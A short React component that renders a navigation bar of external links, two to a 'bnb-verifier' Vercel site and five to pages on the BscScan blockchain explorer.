
import React from 'react';

export default function Navbar() {
  return (
    <nav className="navbar">
      <div className="nav-links">
        <a href="https://bnb-verifier.vercel.app/" target="_blank" rel="noopener noreferrer">Home</a>
        <a href="https://bnb-verifier.vercel.app/" target="_blank" rel="noopener noreferrer">Blockchain</a>
        <a href="https://bscscan.com/tokens" target="_blank" rel="noopener noreferrer">Tokens</a>
        <a href="https://bscscan.com/tokens" target="_blank" rel="noopener noreferrer">Validators</a>
        <a href="https://bscscan.com/nft-top-contracts" target="_blank" rel="noopener noreferrer">NFTs</a>
        <a href="https://bscscan.com/charts" target="_blank" rel="noopener noreferrer">Resources</a>
        <a href="https://bscscan.com/verifyContract" target="_blank" rel="noopener noreferrer">Developers</a>
      </div>
    </nav>
  );
}
